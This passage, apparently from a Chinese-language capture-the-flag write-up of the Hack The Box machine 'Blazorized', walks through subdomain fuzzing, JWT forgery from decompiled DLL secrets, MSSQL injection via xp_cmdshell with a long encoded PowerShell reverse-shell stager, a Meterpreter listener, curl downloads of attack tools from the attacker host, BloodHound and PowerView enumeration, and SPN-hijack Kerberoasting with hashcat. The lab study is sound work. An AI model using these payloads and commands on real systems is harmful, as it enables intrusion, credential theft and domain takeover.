+<a id="__codelineno-0-53" name="__codelineno-0-53" href="#__codelineno-0-53"></a>|_    Message signing enabled and required
+<a id="__codelineno-0-54" name="__codelineno-0-54" href="#__codelineno-0-54"></a>
+<a id="__codelineno-0-55" name="__codelineno-0-55" href="#__codelineno-0-55"></a>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<a id="__codelineno-0-56" name="__codelineno-0-56" href="#__codelineno-0-56"></a>...
+</code></pre></div>
+<h2 id="fuzz">子域名FUZZ<a class="headerlink" href="#fuzz" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt   -c  -u &#39;http://blazorized.htb/&#39; -H &quot;Host:FUZZ.blazorized.htb&quot; -fc 301,302 -mc all
+</code></pre></div>
+<p><img alt="截图" src="3a1da6b433932d9eb1d4e643f39fa79a.png" /></p>
+<p>我本地扫描全是超时......</p>
+<p>得到admin.blazorized.htb子域名</p>
+<h2 id="port-445">Port - 445<a class="headerlink" href="#port-445" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>┌──(root㉿kali)-[/home/tom/桌面]
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>└─# smbclient -N -L 10.10.11.22
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>Anonymous login successful
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>        Sharename       Type      Comment
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>        ---------       ----      -------
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>Reconnecting with SMB1 for workgroup listing.
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>do_connect: Connection to 10.10.11.22 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>Unable to connect with SMB1 -- no workgroup available
+</code></pre></div>
+<p>不存在匿名访问。</p>
+<h2 id="website-80">Website - 80<a class="headerlink" href="#website-80" title="Permanent link">&para;</a></h2>
+<p><img alt="截图" src="10b062f8318d471c0839c9437ad44238.png" /></p>
+<p>加入hosts文件后访问。</p>
+<p><img alt="截图" src="72b355da38af2491ad95f181b0328cc8.png" /></p>
+<h3 id="adminblazorizedhtb">admin.blazorized.htb<a class="headerlink" href="#adminblazorizedhtb" title="Permanent link">&para;</a></h3>
+<p>将其加入hosts文件后访问</p>
+<p><img alt="截图" src="1e15355ded3b52a9f0843e826415d927.png" /></p>
+<p><img alt="截图" src="da74a283681a812f9e7d5906474d7359.png" /></p>
+<p>发现需要凭证才能够登录</p>
+<p><img alt="截图" src="8d9c297adc0ab68469ed2b6da264f742.png" /></p>
+<p>可以发现web页面是基于Blazor框架搭建的网站。</p>
+<h2 id="js">JS文件<a class="headerlink" href="#js" title="Permanent link">&para;</a></h2>
+<p>由于该网站的前端是利用Blazor框架搭建而成的，我们可以从该框架下手，搜索关于该框架的信息，我们可以知道js文件实现了网站的几个特定功能。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>http://blazorized.htb/_content/MudBlazor.Markdown/MudBlazor.Markdown.min.js
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>http://blazorized.htb/_framework/blazor.webassembly.js
+</code></pre></div>
+<p><img alt="截图" src="9f78b559b754174b1d9ba74653622769.png" /></p>
+<p><img alt="截图" src="c41bbc28dfad5247d5e6870bee26ef8f.png" /></p>
+<p>看上去已经被混淆了，对其进行反混淆:https://www.sojson.com/jsjiemi.html</p>
+<p><img alt="截图" src="3895510b20de85f89b5c1ec12d76d5cf.png" /></p>
+<p><img alt="截图" src="37737e496794f9df9490af6e557e8132.png" /></p>
+<p>将代码提取出来，搜索_framework，能够发现一个隐藏的接口</p>
+<p><img alt="截图" src="ec7526ff9c82e075dc1499d38b366863.png" /></p>
+<p>访问json文件可以得到一些dll文件 </p>
+<p><img alt="截图" src="59ab94d9be946551100802ad26144cae.png" /></p>
+<p>经过观察发现，除了默认的Microsoft dll文件外，还有新增的几个blazor dll文件</p>
+<blockquote>
+<p>"Blazored.LocalStorage.dll": "sha256-5V8ovY1srbIIz7lzzMhLd3nNJ9LJ6bHoBOnLJahv8Go="</p>
+</blockquote>
+<h1 id="_2">允许我们在本地存储中存储和检索数据<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
+<p>"Blazorized.DigitalGarden.dll": "sha256-YH2BGBuuUllYRVTLRSM+TxZtmhmNitErmBqq1Xb1fdI="</p>
+<h1 id="blazordigitalgarden">Blazor应用程序专用的自定义程序集。包含与“DigitalGarden”特性或功能相关的代码<a class="headerlink" href="#blazordigitalgarden" title="Permanent link">&para;</a></h1>
+<p>"Blazorized.Shared.dll": "sha256-Bz\/iaIKjbUZ4pzYB1LxrExKonhSlVdPH63LsehtJDqY="</p>
+<h1 id="blazor">包含Blazor应用程序不同部分使用的共享代码和资源。包括通用模型、服务或实用功能<a class="headerlink" href="#blazor" title="Permanent link">&para;</a></h1>
+<p>"Blazorized.Helpers.dll": "sha256-ekLzpGbbVEn95uwSU2BGWpjosCK\/fqqQRjGFUW0jAQQ="</p>
+<h1 id="blazor_1">包含整个Blazor应用程序使用的辅助函数或实用程序的自定义程序集<a class="headerlink" href="#blazor_1" title="Permanent link">&para;</a></h1>
+<p>下载下来这些有关blazor的配置文件查看。</p>
+<h1 id="_3">漏洞利用<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h1>
+<p>下载dll文件后使用DNSPY反编译工具打开寻找过后可以发现jwt、安全密钥、高权限用户等</p>
+<blockquote>
+<p>dnspy是一款.Net平台的集反编译器、程序集编辑器和调试器的利器</p>
+</blockquote>
+<p><img alt="截图" src="44d829b540373b12c8ee46ac8e43de9a.png" /></p>
+<p>利用得到的信息，生成一个JWT。</p>
+<p><img alt="截图" src="51e8bdefb55f1faae6d2c177cdf5e5a7.png" /></p>
+<p><img alt="1722452347652.png" src="6f4e1a24f48e64ce654a6ea6fd2d42cb.png" /></p>
+<p>将这一段JWT的内容添加到本地存储以访问admin界面</p>
+<p><img alt="截图" src="3baa2bc732850c2bd2bdd504214d01d1.png" /></p>
+<p>刷新进入。</p>
+<h2 id="msfshell">msf弹回shell<a class="headerlink" href="#msfshell" title="Permanent link">&para;</a></h2>
+<p>寻找漏洞利用点，发现http://admin.blazorized.htb/check-duplicate-post-title接口处存在MSSQL数据库SQL注入漏洞。</p>
+<p>这里直接尝试使用xp_cmdshell执行反弹shell命令：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>&#39;;exec master..xp_cmdshell &#39;powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAVwBhADUATwBpAFMAaABMADkAMwBQADAAcgArAEQAQQBSAGEAcgBSAHQASwA3ADcAYQB1AHoARQBSAEYAdwBVAFUAQQBWAC8ANAA3AHQAdgBSAFUAVQBBAHAAaABjAFcAcgBBAEEAWAB2AHoAbgAvAGYAQQByAFcAbgBaADYAZABuAGQAeQBKADIAagBUAEMAbwBnAHMAcgBLAFUAeQBkAFAAWgBxAFUARwBvADAAYwB0AEkAcwBpAEkAVgBNACsARQB6AE8ATQBTAGsAaABCADUATABzAFAAZQAzACsAOQBpADEANABpAHkAYwBUAFoANAAyADgAUABvAHoAUwBlAGUAOABRAFoATQBrADgAQQB3AFoAUAA2ACsAdgA1AHMAQQBBAGgAeQBtACsATwBVAEkAeQBKAHYAagBtAFQARwBHAFoAUwBhAGYAWgBBAHUAaABHAFIATgBZAHUAcgB1ADcAdgA4AHQAZgB4AFcANABJAGQAdgBEAE4AQgBSAEUANgB3AGoAYwBIAFIAcABaAG4AaABzAHgAWABwAHYAagBDACsAVAA3AHYATwBRAEMANQByADMALwA4ADAAWQBzAEoAZwBXADUAMABtAFYAZgA2AE0ATwBMAEMARQBEAG8ANgBSAGoAQQBzAGwAcABoAC8ATQBpAHMATABFAHYAZwA0ADEAbQAxAG8AUgBNAHoAZgB6AEoAZQAzAFMAaAA5ADcATwBzAEQAWABaAFcAawBQAEcAQgBZADkAQgBlAGUAYQAyAFQAZgBGAE0AMABCADIAZwBvAHIAbQBZAHgAUQBWAEMAMwAvADkAVgBTAGkAOQBQAE4AWgBlAEsAMABJAFEAQQB4AHcAVwBDADEAbwBhAFIAdABDAHAAbQBCAGcAWABTAHMAeQAzAFUAdQBaAHcAbgB2AHEAdwBXAEYAQwBSAFEAYgB6AFEAMgAwAFcAVgBGAFgATAByAGIARwBXAFIAbwB4AC8AbAA0AE4AVQBMADkAawBMAHAAZQByAEsAOQBEACsAZwA1AGYAbgAzAEkAYgBOAGUATABUAGIARgBBAGgAeABQAEsARABYAGYAaABzAEYAQgBtAFgAagBKAC8ATAA2ACsAdgB6AEoALwB2AGEARwBhAHgARwB5AEUASABWAGkAUQAzAGcAcwBUAHoATgBVAGkATwB5AEkAQgBoAFoAUQBCAGMARQA4AE0AWgAzAEYARwB6AFEAawBoAGoANQB1ADQATABKAFEAcQBDAHcAQwBnAG0ATABuAFAARABRAHUAMgBPADMAZwBFAFcAdgA3AGcAeAB4AG0AVwA2ADcAOAB2AHYANwB2AHQAYQBIAE0ASABUAGoAZAB6AGYATgBTAHAAKwBOAEsASwByAEoAaABFAHAAbABhACsAYQArAEIAMAA2ADEARgB3ADMAbAArADMAbwBjAFgANQBDAC8AMABGAGMASgBmAHIANwBTAFcAQwBsACsAMgArAGYAUwBkAFcARQBHAE8ANQBCAEIATgA4AGkAeQB1ADgASAByAGQANwBmADMAYgAzAGsAUQAwAGoAUABVADUAeAA0AEkAYwByAHQAdgBqAEwAVgBNAHEATgBTAEUAQwBEAHkAUwBKAHEARgBjADAANQBpAFcASAByADkASABwACsATAAyADUAdABsAFcAUAA3AGwAUgByAFcAYgAxAGQAWABtAEUAcAA0AEwAagBxAC8ATQB5ADkASgBEADUAdQB2ADkAWABlAG4AKwBxAHAANwBzAC8AWgBzAGUASQAyAHgAQwBrAG4AMwAvAGQAVABiAHcAYwBJAGQAYwB5AEsAYwB1AGMASgBCAHgARQAzAHoAeABzADUAagBCAEgAWQBZADUASAA1AFgAYgBzAGgASABGAFcAUwB4AGMAUAAwAEMAVAB2ADcASgBUAHkAQQBoADkAKwBkAGwATQBjAEYARAAwAGIAdAB1ADkAZwBPAE0ATQBHAHYAZQBRAG8AcQBLAFMASwBQADAASQA1AGgATABEAFkAawBGAHkAVgBlAGgAUQAvAGkANQB6AEsAdABNAHYATwA1AHAAbQA4AEwAYgA2AG0AbAByAHAAegBYAHMAMgB6ADcAVABjAHcAeQBBAE0AeQA4AHcAawBwAG4AbAB1AGwAQgBrAE4AQQBnAHoATgBNAHMATwA1AEkAYgBwACsANAB1AEwASQB5ADQAZQBGADcAMwBEAFYARwBFAGYASQBBAEcARgAwADIAKwA2ADEAOQBBAG0AbABWADkAYwA5AHoANgBVAFoARQB4AHMAMAB1AHAAUwBHAHUAZQBaAEQAQQB3AEcAYwBzAFYASgBtAEIAcwBpAEUAMwBWAFIARAArAHgAdQBFAHcAcQBlAGMAOQBBAEQARwBOAE8AWABvAFQAawBjAGEARQAvAG8AbQA0ADAASwBMAE0AcwAwAFEAcwAvAHoAdgArAGkAaABWAE4AQgBoAEoAagBvACsAaABRADEAZgBuAFYAVQBqAEUAWQBFADkAcgB6AGoAVwBqAGMAcgBtAEIAUABUAFEATAAvAHcASAAyAEwAVQA4AHUAUwBaAEYAeABkAFMAUABwAEEAMgBnAHEAQQBBADEANwBVAFoAbABaAEkAaABMAFIAdQBsAFkAbwAvAHkAUwA4AC8AdwAzAGUAagB5AFgAbQBCADUAZwA5AEEAcQArAEIATABPAGEASgBLAE8AMQBvAFEAYgA5AFUAQQBjAHAATwBpAE0ANgAwAEcATQBPAEEAZQBTADUAbABLAGYAagBTAFQAYQBNAHMAbAAvAEoAdABqAE8AeQA2ACsAZgBwAE8AZABFADQAcgBpAGEAaQBSAFMARAB5AG4AQwAwAEwAWQBhAG0AaAA1AGoAUwBzAFcANgBtAHkAOABUAHoAbwBUAHAAWgBXAHEAdABzAFEATwAwADQAMAA3AFMAZwB4ADMAUwBZAFMAagAyAEEAYwB0AEsANQBtAHkAcwBXAGYATQBJAHgASQBNAEIASgA3AE8AWgB3AFkAYgBoAHIAaQBQAGYAZAAxAFMAQQBwAEEAbwB0AHAAMQAwAGUAdQB0AFUAbQBIAEMAcwBnAGwAcQBvAGkAYQBSAFkANgBaADUAZABFAFIAawBPAHQAWgB1AE8AdgBjADIAcwBRADYAVABqAFMAUABSAHcAMgBKAFoANwA0AG0AbwBCAGsAQgAzAGsAdgBtAEsAbgBVAFQATQBGAGsAQwBwAG4AbwAyAFcAUgBNAFEAdQA5AHoAVwBrAFUAUwBNAGMASgBaADYANgBPAFIAcwB1AFIAUABiAEUAVgBVAGQAdABsAEwATQBRACsARQBlAEwAeABaAEIATQByAGcAZQBKAEkAcQBHAEUAZAArAFcAVQAwAFAARQByADkANQA0AEgATQBiAHMAQQB6ADEAdABzAHcAdAB6AGUARAB6AE4AYwBtADIAQgA5AEIATgBqADkAMwBzAGoAawBLAGUAcABCAGsAZgBqAGEAVQBmAFYAaQB2AHQAZQBCAHEAMgBOADYANABQAG8ASwByAGUASAA4ACsAagBaAEIAaABuAG4AbgBJAEQAdQBuADcAMgBGAE0ATgBQADYAeQBQAHoAcwBiAHUAYwBMAEMAQgBYADEAdABvAGgANQBvADgAWAAyAHoAWABsAEoAcwBhAEMASQBpAG8AdAA0AGkAMgA4AGYARgB4AHkAUwAwAE8AOQBjAG0AVwA1AE4AaQBPAEkAcwBVADQAeQBuAEEAaQBnAHgAMgBlAE4ALwA1AGgAYQB5ADQARABvAFQANwBSAHAAYwBVAEEAawB5AEEAZQBJAHUAZABKAGMASwBYADAAdQBzAFkAWgBwAHAAcgBXAHAAVQA5ADUAYQA4AHIAQgBjADkATQA4AHMAKwBuAEEAYgA0AEEAVwBRAFoAVABUAGgAUABwAHAAWgAvAHcAYQBpADkAQwBXAFYAbQBQAFgAVwBJAHYASQBNAFMAeQBXAG4AOQBsAEcAeAA0AG0ARABKAHMAWABkAEcASQB5AEcAOABqAG8AaABRAFQAUQBrAHcAUgBFAEgAegBmAEgARQB5AEgARABuAGQAdABuADYAYQBRAE8AUABhADMAUgA5AG8ATgB1AEsARABCADQAawBwAE4AcQBnAGMAdwA0AFYARwBSADYAegBjAFQAcgBoADUAUwBTAFYAYgBPAGsANQA3AG0AWgAyAGYATAA5ADUAbQBnADQATwB0AHAAUQArAFYAUgAvADYAYwA3ADYATABBAGUAcwBNADEAagB0AGIANQBBAGQAagB3AEYAcgA4AHoAaQBGAGIAdwBWAHIAeQBhAFUALwBXAHQAcgBwAGwAQwB2AE0ASgBDAGQATQBOAFMAbABZAHMAcAA4AFIAUABXADgAUwA3AGQAUgBzAHQAZwBBAEgAawA1AHQAcAB4AEIAOABaAEEAMQBLAGMAdABYAFcAcwAzAEoAOQB6ADgAeQBkAHMAdgBqAE8AQQBzAGoAYQAxAE8ATwBtAEkAWAB3AG4AYgBHAE8AMABOAGgAZABxAGkAdAArADkATgBSAFAAQgBlAHgAUABLADkAMgBlAG4AegBYAEcAQQBrAG4AVgBaAGsASwB5AFgAaABSAEgAYQA2ADEAZwB6AGkAWgBXAFgAdABlAGQANwB2AEIAZABxADgAdQArAEoAbQA2ADQAZQBvAHoARwBnADkAVABYAFkAbwBjAHIANgA4AE4AWAB0AHgAWAB0AFIANQBxACsATgBMAFQANgBDAFIAbwAyADMAYQBmADAAOABQAFoAcAB0AHYAawAxAFAAawBwAGUAbwBaAEQAVwBlAEwANwBoAC8ARgBvAGgAUwBGADgAcwBFAEsAQwBTAFcAZQA5ADQAeQBCAHYAUwBkAEsAdQBOADcATwBuAEMANgA0ADkASAB6AGUANQBxAGoAcQAxADEAbwBkADEAVgBiAE8AbwAwAHUAMgBFAHQAOQB2AEoAWABoAFUAbwArADIAcQBZAGUAcABJAHcAUAB4AEcAdwBZAHEAdQB0AFcARQBhAHAAdgA1AFgAWAA2AC8ASABoAFEARwBwAHEAMQBCADYARwBVAHMATwBXAGgAZABDAHMASAB6AFgAaAArAGYAdwBzAFQAeQB5ADUAcwA0AFIASQBKAHAAYQBmAGwAWgBVAEcAbAA2AGEAdABBAEgATwB0AEoARgBHAGEAcwBpAHAAYgB6ADkAQwBFAFkAcAB5AEEARABuAFoASQB6AFIASQBQAFUAbQBxAEQANQBUAGoAYQArAHgAMQAwAEMAcgBmAFYATABWAGoAbwBzADQAZABHAHEARAB3ADkASQBiADgASgBGADMAQgBVAHQANgBvAEQAOAA2AGwANQBJAEYAVwAvAFUALwBkAHIALwBaAE0ANABRAGsATQBrAFcAZgAwAFIARwBoAHQARABVAGUARQA5AEQAaQBvADgASABQAGQAMABuACsAVwBUAGEAYQBlADYAUQBwADQAaABLAHYATQBsAHEAagAzADEAbgBzAHkAcQBOAFYAeQBaAGgAKwBHAHoAVQBaADMAaQBoAHIAeABiAEsAMABlADQAVgBPAGQATgBHAFIAeABFAEMARwBOAG4AUABlAGgARgAwAHIAUwBqAE4AdQB5AE4AWAA1ADkAagBUADYAeABkAE4AQgAxAHMAcQBWAFoAcABqAHMAcQA2AGQATQA1AHkAVgBRAGEAYgBQAEcAZgBsAEwAVwB5AFkAcAB5AFEANgBzADYARABkAFAAUgBuADkATwBFAGoAbwB2ADAAbwAxACsAYgBDAGkAYQAwAC8AWgBtAGkAQgBnAHEAYQA1AFYAZgBSAFcAYwBxAEsANQBCAGkAMwBlADUAbABtADQAdgBtADAAcwB4ADYATQAyAEkARgBQAGQAbwAzAHUAdABWAFcASQAvAGEASQBOADEAUQB2AGEAbQAyADgAYwBBAHIAeAAxAEgAYgBxAEgAZQBsAE8AVAAvAEwALwAwAHQAKwBOAHAAMQBKAFoAMgBGAHQATABzAE8AdgBlAFoAbgBjAGUAWQBSADIAUABrAG4AVwBUAGYAeQBEAG8AYwA5AEgASABEAEgAdgB4AFkANgBXAE8ARgBwAGEAcwAvAGMAUABEADMAawA1AHYASAB2AC8AOQBQAEkAbABlAGIAMgAxAGsATwAvAHoAUgB6ADIAaAAyADkAVwBiADkAMwBmAGYAYgByADMAQwBFAFgAeQBvAG0ATAAvAHEAegBGAFIAQQBRAGcAdABnAFcAawBsAHAAZAAzAFcANwBHADAAVwBQAGkATgBjAGUAYQBlAEsAaAB6AEsASgBZAC8ATAB5AHQAUAAwAEQAaQBRAGsAeABiAFgAdABvAFUAMwAyADQAVQBEAG0AUABQAHkATABxADYAWAA3AFIAWABmADcANwBYAGYASABwAHoATAB1AGkAdwB6AG4ANAA2AEsAbgAyAC8ASABFAHEAbAAyADcAVwBuAHgANwB0AGQAMwB2AHAAYwBqADMAagByAEEATAA5AGYASQAxAHQANgB2AHYASQBIAEkAaABYAG8ANwBpAE8AcgB6AEYAUwBUAGUAcgBWAGEAegBaADYATgBLAHQAMwB0ADkANABuAHAAZQBYADUAYQBmAE4AKwB2AG4AUABWACsASAA2AEIAOABkAEkAVgB6AFYAKwAvAE4ARwBvAGwAZABCAC8ANABmAFkALwBDAEQAMQAvAC8ATwBiAHMAWgBmADMAagA5ACsAWgB5ADkASAA5AEQAbABsADIAWQBYADgATAB4AHcAbgAzAHoAcgBmAEQAUQBBAEEAIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA=&#39; --+
+</code></pre></div>
+<p>这里我使用cs生成的payload，之后利用msf监听反弹shell。</p>
+<h3 id="cspayload">cs生成payload<a class="headerlink" href="#cspayload" title="Permanent link">&para;</a></h3>
+<p>注意是x64架构。</p>
+<p><img alt="1722460378693.png" src="a188680b78e2b4ea24051133282314a8.png" /></p>
+<p>得到exp</p>
+<p><img alt="截图" src="bb8a6c9fc7ac08418338f0d323a855e9.png" /></p>
+<p>之后将上面的exp与代码执行点相结合。</p>
+<h3 id="msfshell_1">msf监听反弹shell<a class="headerlink" href="#msfshell_1" title="Permanent link">&para;</a></h3>
+<p>注意架构是x64</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>msf6 &gt; use exploit/multi/handler
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>[*] Using configured payload generic/shell_reverse_tcp
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>payload =&gt; windows/x64/meterpreter/reverse_tcp
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>msf6 exploit(multi/handler) &gt; set lhost 10.10.16.72
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>lhost =&gt; 10.10.16.72
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>msf6 exploit(multi/handler) &gt; set lport 1234
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>lport =&gt; 1234
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>msf6 exploit(multi/handler) &gt; run
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>[*] Started reverse TCP handler on 10.10.16.72:1234 
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>[*] Sending stage (200774 bytes) to 10.10.11.22
+<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>[-] Meterpreter session 4 is not valid and will be closed
+<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>[*] 10.10.11.22 - Meterpreter session 4 closed.
+<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>[*] Sending stage (200774 bytes) to 10.10.11.22
+<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>[*] Meterpreter session 5 opened (10.10.16.72:1234 -&gt; 10.10.11.22:52370) at 2024-08-01 05:07:18 +0800
+</code></pre></div>
+<p><img alt="截图" src="330014267adc9aec8bb2d372db7286a3.png" /></p>
+<p><img alt="截图" src="0ac19f066862899bc8716d99b34ca6ec.png" /></p>
+<h2 id="sharphound">sharphound搜集域信息<a class="headerlink" href="#sharphound" title="Permanent link">&para;</a></h2>
+<p>上传sharphound.exe</p>
+<blockquote>
+<p>BloodHound以用图与线的形式，将域内用户、计算机、组、Sessions、ACLs以及域内所有相关用户、组、计算机、登陆信息、访问控制策略之间的关系更直观的展现在Red Team面前进行更便捷的分析域内情况，更快速的在域内提升自己的权限。它也可以使Blue Team成员对己方网络系统进行更好的安全检测及保证域的安全性。</p>
+<p>BloodHound通过在域内导出相关信息，在将数据收集后，将其导入Neo4j数据库中，进行展示分析。Neo4j是一款NOSQL图形数据库，它将结构化数据存储在网络上而不是表中，Bloodhound正是利用这种特性加以合理分析，可以更加直观的将数据以节点空间”来表达相关数据。</p>
+<p>操作步骤：https://www.freebuf.com/articles/web/288370.html</p>
+</blockquote>
+<p>通过curl命令远程下载sharphound.exe</p>
+<p><img alt="截图" src="a812c02b5940ec1e7c75f0edb9eb6522.png" /></p>
+<p>运行sharphound.exe</p>
+<p><img alt="截图" src="23236173c53598f863803d985c7b5728.png" /></p>
+<p>运行结果：产生BloodHound.zip文件，我们需要将其加载到BloodHound服务中去。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>C:\Users\Public&gt;dir
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>dir
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a> Volume in drive C has no label.
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a> Volume Serial Number is 9756-87FD
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a> Directory of C:\Users\Public
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>07/31/2024  04:51 PM    &lt;DIR&gt;          .
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>07/31/2024  04:51 PM    &lt;DIR&gt;          ..
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>07/31/2024  04:51 PM            12,360 20240731165141_BloodHound.zip
+<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>10/06/2021  03:38 PM    &lt;DIR&gt;          Documents
+<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>09/15/2018  02:19 AM    &lt;DIR&gt;          Downloads
+<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>09/15/2018  02:19 AM    &lt;DIR&gt;          Music
+<a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>09/15/2018  02:19 AM    &lt;DIR&gt;          Pictures
+<a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a>07/31/2024  04:50 PM         1,046,528 qwe.exe
+<a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a>09/15/2018  02:19 AM    &lt;DIR&gt;          Videos
+<a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a>07/31/2024  04:51 PM            10,667 ZWY3N2UxMzgtNTg0Zi00OTg1LTllNmQtMDg1Yjc5ZmYzNWMz.bin
+<a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a>               3 File(s)      1,069,555 bytes
+<a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a>               7 Dir(s)   6,110,216,192 bytes free
+</code></pre></div>
+<p>下载BloodHound.zip文件到本地</p>
+<p><img alt="截图" src="00b0813ae83e79aca9fb626b45f25c32.png" /></p>
+<p><img alt="截图" src="15158673e6e4d6f517a3bf634df714da.png" /></p>
+<p>查看域内信息</p>
+<p><img alt="截图" src="1bf630cd9b772cc7d2be76f71e2c92ee.png" /></p>
+<h2 id="powerviewps1">PowerView.ps1<a class="headerlink" href="#powerviewps1" title="Permanent link">&para;</a></h2>
+<p>这里不能在meterpreter下使用upload，原因是权限不够，只能shell进去使用curl命令下载</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>C:\Users\Public&gt;curl -o 123.ps1 http://10.10.16.5:8888/powerview.ps1
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>curl -o 3.ps1 http://10.10.16.5:8888/powerview.ps1
+</code></pre></div>
+<p><img alt="截图" src="e0ead441f077b1af9937f5e0ec1b09e6.png" /></p>
+<p>以powershell环境执行ps1</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>Import-Module ./123.ps1
+</code></pre></div>
+<p><img alt="截图" src="eda969e13035237c3c20f32d1c79f650.png" /></p>
+<p><br/></p>
+<h2 id="spn">SPN劫持<a class="headerlink" href="#spn" title="Permanent link">&para;</a></h2>
+<p>执行命令</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>Set-DomainObject -Identity RSA_4810 -SET @{serviceprincipalname=&#39;test/test&#39;}
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>Get-DomainSPNTicket -SPN test/test
+</code></pre></div>
+<p>获取请求服务票据 </p>
+<p><img alt="截图" src="2b2a8bd4bd9115d83616855dfc32db4d.png" /></p>
+<p>复制下来放在hashcat进行解密</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -o found.txt --force
+</code></pre></div>
